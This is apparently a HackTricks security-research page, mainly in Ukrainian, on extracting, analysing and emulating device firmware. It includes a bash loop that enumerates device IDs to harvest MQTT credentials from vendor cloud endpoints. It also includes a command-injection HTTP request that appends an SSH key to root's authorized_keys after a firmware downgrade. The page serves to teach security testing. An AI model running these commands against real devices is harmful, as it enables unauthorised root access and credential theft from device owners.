# Аналіз прошивки

{{#include ../../banners/hacktricks-training.md}}

## **Вступ**

### Пов'язані ресурси


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Прошивка — це критично важливе програмне забезпечення, яке дозволяє пристроям працювати коректно, керуючи та забезпечуючи зв'язок між апаратними компонентами та програмним забезпеченням, з яким взаємодіє користувач. Вона зберігається в постійній пам'яті, що гарантує пристрою доступ до життєво важливих інструкцій з моменту ввімкнення, ведучи до завантаження операційної системи. Дослідження та потенційна модифікація прошивки — важливий крок у виявленні вразливостей безпеки.

## **Збір інформації**

**Збір інформації** — критично важливий початковий крок для розуміння складу пристрою та технологій, що він використовує. Цей процес включає збір даних про:

- Архітектуру CPU та операційну систему, на якій він працює
- Особливості завантажувача (bootloader)
- Апаратну компоновку та datasheets
- Метрики кодової бази та розташування вихідного коду
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень та регуляторні сертифікації
- Архітектурні діаграми та діаграми потоків
- Оцінки безпеки та виявлені вразливості

Для цього **open-source intelligence (OSINT)** інструменти є надзвичайно корисними, як і аналіз будь-яких доступних компонентів open-source software через ручні та автоматизовані процеси рев'ю. Інструменти, такі як [Coverity Scan](https://scan.coverity.com) та [Semmle’s LGTM](https://lgtm.com/#explore), надають безкоштовний статичний аналіз, який можна використовувати для виявлення потенційних проблем.

## **Отримання прошивки**

Отримання прошивки можна здійснити різними способами, кожен з яких має свій рівень складності:

- **Безпосередньо** від джерела (розробники, виробники)
- **Збірка** за наданими інструкціями
- **Завантаження** з офіційних сайтів підтримки
- Використання **Google dork** запитів для пошуку розміщених файлів прошивки
- Доступ до **хмарного сховища** напряму, за допомогою інструментів, таких як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехоплення оновлень через man-in-the-middle техніки
- **Витяг** з пристрою через з'єднання, такі як **UART**, **JTAG** або **PICit**
- Сніффінг (sniffing) запитів оновлень у комунікації пристрою
- Виявлення та використання **hardcoded update endpoints**
- **Дампінг** із завантажувача або через мережу
- **Вилучення та читання** флеш-чіпа, коли всі інші методи не спрацювали, з використанням відповідних апаратних інструментів

## Аналіз прошивки

Тепер, коли у вас є прошивка, потрібно витягти з неї інформацію, щоб зрозуміти, як її обробляти. Різні інструменти, які можна для цього використовувати:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Якщо за допомогою цих інструментів ви мало що знайшли, перевірте **ентропію** образу командою `binwalk -E <bin>`: якщо ентропія низька — навряд чи він зашифрований. Якщо ентропія висока — швидше за все він зашифрований (або стиснутий якимось чином).

Крім того, ви можете використовувати ці інструменти для витягання **файлів, вбудованих у firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Або [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) для огляду файлу.

### Getting the Filesystem

За допомогою раніше згаданих інструментів, таких як `binwalk -ev <bin>`, ви повинні були змогти **витягти файлову систему**.\
Binwalk зазвичай витягує її в **папку з назвою типу файлової системи**, яка зазвичай є однією з наступних: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Інколи binwalk **не має магічного байту файлової системи у своїх сигнатурах**. У таких випадках використайте binwalk, щоб **знайти offset файлової системи та вирізати стислену файлову систему** з бінарного файлу і **вручну витягти** файлову систему відповідно до її типу, використовуючи наведені нижче кроки.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Виконайте наступну **dd command** для carving файлової системи Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Або також можна виконати наступну команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується в наведеному вище прикладі)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у директорії `squashfs-root`.

- Для CPIO архівів

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs із NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Аналіз прошивки

Після отримання прошивки важливо її розібрати, щоб зрозуміти структуру та потенційні вразливості. Цей процес передбачає використання різних інструментів для аналізу та витягання цінних даних із образу прошивки.

### Інструменти для початкового аналізу

Нижче наведено набір команд для первинної перевірки бінарного файлу (позначеного як `<bin>`). Ці команди допомагають ідентифікувати типи файлів, витягнути рядки, аналізувати бінарні дані та визначити інформацію про розділи й файлові системи:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Щоб оцінити статус шифрування образу, перевіряють **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія свідчить про відсутність шифрування, тоді як висока ентропія вказує на можливе шифрування або стиснення.

Для вилучення **вбудованих файлів** рекомендовано використовувати інструменти та ресурси, такі як документація **file-data-carving-recovery-tools** та **binvis.io** для інспекції файлів.

### Витягування файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна витягти файлову систему, часто в каталог, названий за типом файлової системи (наприклад, squashfs, ubifs). Однак коли **binwalk** не може розпізнати тип файлової системи через відсутні magic bytes, необхідне ручне витягнення. Це включає використання `binwalk` для визначення зсуву (offset) файлової системи, а потім команду `dd` щоб вирізати файлову систему:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Пізніше, залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs), для ручного витягування вмісту використовують різні команди.

### Аналіз файлової системи

Після витягування файлової системи починається пошук вразливостей. Увага приділяється небезпечним мережевим демонам, жорстко вбудованим обліковим даним, API-ендпоїнтам, функціям сервера оновлень, нескомпільованому коду, скриптам автозапуску та скомпільованим бінарним файлам для офлайн-аналізу.

**Ключові місця** та **елементи** для перевірки включають:

- **etc/shadow** та **etc/passwd** для облікових записів користувачів
- SSL сертифікати та ключі в **etc/ssl**
- Файли конфігурацій та скрипти на наявність вразливостей
- Вбудовані бінарні файли для подальшого аналізу
- Типові веб‑сервери та бінарні файли IoT-пристроїв

Кілька інструментів допомагають у виявленні чутливої інформації та вразливостей у файловій системі:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) та [**Firmwalker**](https://github.com/craigz28/firmwalker) для пошуку чутливої інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для всебічного аналізу прошивки
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) та [**EMBA**](https://github.com/e-m-b-a/emba) для статичного та динамічного аналізу

### Перевірки безпеки скомпільованих бінарних файлів

Як вихідний код, так і скомпільовані бінарні файли, виявлені у файловій системі, повинні бути ретельно перевірені на наявність вразливостей. Інструменти на кшталт **checksec.sh** для Unix-бінарників та **PESecurity** для Windows-бінарників допомагають виявити незахищені бінарні файли, які можуть бути використані.

## Збирання конфігурації cloud (cloud config) та MQTT облікових даних через похідні URL‑токени

Багато IoT-хабів отримують конфігурацію для конкретного пристрою з cloud endpoint, який виглядає так:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Під час аналізу прошивки можна виявити, що <token> генерується локально з device ID за допомогою жорстко вбудованого секрету, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і подається у вигляді шістнадцяткового рядка у верхньому регістрі

Такий підхід дозволяє будь‑кому, хто дізнається deviceId і STATIC_KEY, відтворити URL і витягнути cloud config, що часто розкриває MQTT облікові дані у відкритому вигляді і префікси тем.

Практичний порядок дій:

1) Витягніть deviceId із журналів завантаження UART

- Підключіть 3.3V UART-адаптер (TX/RX/GND) і захопіть логи:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Шукайте рядки, що виводять шаблон URL конфігурації cloud і адресу брокера, наприклад:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Відновити STATIC_KEY і алгоритм token з firmware

- Завантажте бінарні файли в Ghidra/radare2 та шукайте шлях конфігурації ("/pf/") або використання MD5.
- Підтвердіть алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Виведіть token у Bash і переведіть дайджест у верхній регістр:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Отримання cloud config та MQTT credentials

- Сформуйте URL і отримайте JSON за допомогою curl; розпарсіть за допомогою jq, щоб витягти секрети:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Зловживати plaintext MQTT та слабкими topic ACLs (якщо присутні)

- Використовуйте recovered credentials, щоб підписатися на maintenance topics та шукати sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Перелічення передбачуваних device IDs (масштабно, з авторизацією)

- Багато екосистем вбудовують vendor OUI/product/type bytes, за якими слідує послідовний суфікс.
- Можна ітерувати candidate IDs, отримувати tokens і витягувати configs програмно:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Завжди отримуйте явний дозвіл перед спробою mass enumeration.
- За можливості віддавайте перевагу emulation або static analysis для відновлення секретів без модифікації target hardware.

The process of emulating firmware enables **dynamic analysis** either of a device's operation or an individual program. This approach can encounter challenges with hardware or architecture dependencies, but transferring the root filesystem or specific binaries to a device with matching architecture and endianness, such as a Raspberry Pi, or to a pre-built virtual machine, can facilitate further testing.

### Емуляція окремих binaries

Для аналізу окремих програм важливо визначити endianness програми та її CPU architecture.

#### Приклад для MIPS Architecture

Щоб емулювати MIPS architecture binary, можна використати команду:
```bash
file ./squashfs-root/bin/busybox
```
А щоб встановити необхідні інструменти емуляції:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dynamic Analysis in Practice

На цьому етапі для аналізу використовується реальний або емульований пристрій. Важливо зберігати shell-доступ до OS і filesystem. Емуляція може не повністю відтворювати взаємодію з hardware, тому іноді потрібно перезавантажувати емульоване середовище. Під час аналізу слід повторно переглядати filesystem, досліджувати exposed webpages та network services, а також шукати вразливості в bootloader. Тести цілісності firmware критично важливі для виявлення потенційних backdoor-вразливостей.

## Runtime Analysis Techniques

Runtime analysis involves interacting with a process or binary in its operating environment, using tools like gdb-multiarch, Frida, and Ghidra for setting breakpoints and identifying vulnerabilities through fuzzing and other techniques.

## Binary Exploitation and Proof-of-Concept

Developing a PoC for identified vulnerabilities requires a deep understanding of the target architecture and programming in lower-level languages. Binary runtime protections in embedded systems are rare, but when present, techniques like Return Oriented Programming (ROP) may be necessary.

## Prepared Operating Systems for Firmware Analysis

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is a distro intended to help you perform security assessment and penetration testing of Internet of Things (IoT) devices. It saves you a lot of time by providing a pre-configured environment with all the necessary tools loaded.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Навіть коли виробник реалізує перевірки криптографічних підписів для firmware images, часто відсутній захист від version rollback (downgrade). Якщо boot- або recovery-loader лише перевіряє signature за вбудованим public key, але не порівнює *version* (або monotonic counter) образу, що прошивається, атакувальник може легітимно встановити стару, вразливу firmware, яка все ще має валідну signature, і тим самим знову ввести виправлені вразливості.

Typical attack workflow:

1. **Obtain an older signed image**
* Grab it from the vendor’s public download portal, CDN or support site.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
У вразливій (downgraded) прошивці параметр `md5` безпосередньо підставляється в shell-команду без санітизації, що дозволяє інжектувати довільні команди (here – enabling SSH key-based root access). Пізніші версії прошивки ввели базовий фільтр символів, але відсутність downgrade protection робить виправлення марним.

### Витягнення прошивки з мобільних додатків

Багато виробників пакують повні образи прошивки всередині супровідних мобільних додатків, щоб додаток міг оновлювати пристрій через Bluetooth/Wi‑Fi. Такі пакети зазвичай зберігаються у незашифрованому вигляді в APK/APEX за шляхами на кшталт `assets/fw/` або `res/raw/`. Інструменти на кшталт `apktool`, `ghidra` або навіть звичайний `unzip` дозволяють витягти підписані образи без доступу до фізичного обладнання.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Контрольний список для оцінки логіки оновлення

* Чи захищено належним чином транспорт/аутентифікація *update endpoint* (TLS + authentication)?
* Чи порівнює пристрій **version numbers** або **monotonic anti-rollback counter** перед прошивкою?
* Чи перевіряється образ в межах secure boot chain (наприклад, signatures checked by ROM code)?
* Чи виконує userland code додаткові перевірки (наприклад, allowed partition map, model number)?
* Чи використовують *partial* або *backup* потоки оновлення ту ж саму логіку валідації?

> 💡  Якщо будь-яке з вищезазначеного відсутнє, платформа, ймовірно, вразлива до rollback attacks.

## Вразливі прошивки для практики

Для практики виявлення вразливостей у firmware використовуйте наведені нижче вразливі проекти як відправну точку.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Посилання

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Навчання та сертифікація

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
